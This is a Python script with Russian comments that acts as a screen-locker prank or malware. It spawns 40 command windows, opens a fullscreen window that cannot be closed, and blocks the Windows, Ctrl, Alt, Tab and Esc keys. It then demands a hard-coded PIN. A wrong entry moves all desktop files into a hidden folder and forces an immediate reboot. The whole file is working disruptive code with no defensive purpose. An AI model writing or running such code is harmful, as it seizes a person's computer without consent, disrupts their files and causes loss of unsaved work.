import tkinter as tk
from tkinter import simpledialog, messagebox
import subprocess
import os
import keyboard  # Новая библиотека для блокировки клавиш

def open_cmd_windows():
    for _ in range(40):
        subprocess.Popen('start cmd', shell=True)

def disable_event(event):
    if event.keysym in ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9'):
        return
    else:
        return "break"

def block_keys():
    # Блокировка клавиш Windows
    keyboard.block_key('left windows')
    keyboard.block_key('right windows')
    # Блокировка клавиш Ctrl+Alt+Del, Alt+Tab, Ctrl+Shift+Esc
    keyboard.block_key('ctrl')
    keyboard.block_key('alt')
    keyboard.block_key('tab')
    keyboard.block_key('esc')

def check_password():
    password = simpledialog.askstring("Пароль", "Введите пароль:", show='*')
    if password == '2914':
        messagebox.showinfo("Успех", "Правильный пароль! Закрытие всех окон.")
        root.destroy()
    else:
        messagebox.showerror("Ошибка", "Неверный пароль! Компьютер будет перезагружен.")
        hide_desktop_icons()
        if os.name == 'nt':  # Для Windows
            os.system("shutdown /r /t 1")
        else:  # Для Unix систем
            os.system("sudo reboot")

def hide_desktop_icons():
    if os.name == 'nt':  # Для Windows
        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        hidden_folder = os.path.join(desktop, 'HiddenIcons')
        if not os.path.exists(hidden_folder):
            os.makedirs(hidden_folder)
        for item in os.listdir(desktop):
            item_path = os.path.join(desktop, item)
            if os.path.isfile(item_path) or os.path.isdir(item_path):
                try:
                    os.rename(item_path, os.path.join(hidden_folder, item))
                except Exception as e:
                    print(f"Не удалось переместить {item}: {e}")

# Открытие 40 командных строк
open_cmd_windows()

# Создание главного окна
root = tk.Tk()
root.attributes('-fullscreen', True)
root.configure(background='white')

# Отключаем стандартное закрытие окна
root.protocol("WM_DELETE_WINDOW", lambda: None)

# Блокируем все клавиши, кроме цифровых
root.bind_all('<Key>', disable_event)

# Блокируем клавиши Windows и другие комбинации
block_keys()

# Запрашиваем пароль
root.after(1000, lambda: check_password())  # 1 попытка для ввода пароля

# Показываем окно и запускаем главный цикл
root.mainloop()
